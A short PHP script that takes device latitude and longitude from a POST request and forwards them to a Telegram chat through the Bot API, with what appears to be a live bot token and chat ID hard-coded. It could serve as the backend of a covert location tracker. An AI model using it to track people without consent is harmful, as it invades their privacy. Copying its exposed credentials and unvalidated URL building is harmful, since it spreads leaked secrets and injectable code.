<?php

// Set the Telegram bot token and chat ID

$token = '5655450005:AAGsq4OSKe_XbuGhotum3tzPl8bgyWzyJ5Y';

$chat_id = '5879421948';

// Get the device coordinates

$latitude = $_POST['latitude'];

$longitude = $_POST['longitude'];

// Construct the Telegram Bot API URL

$url = 'https://api.telegram.org/bot' . $token . '/sendLocation?chat_id=' . $chat_id . '&latitude=' . $latitude . '&longitude=' . $longitude;

// Send the request to the Telegram Bot API

$response = file_get_contents($url);

// Check if the request was successful

if ($response === false) {

    echo 'Error sending coordinates to Telegram bot';

} else {

    echo 'Coordinates sent to Telegram bot';

}

?>

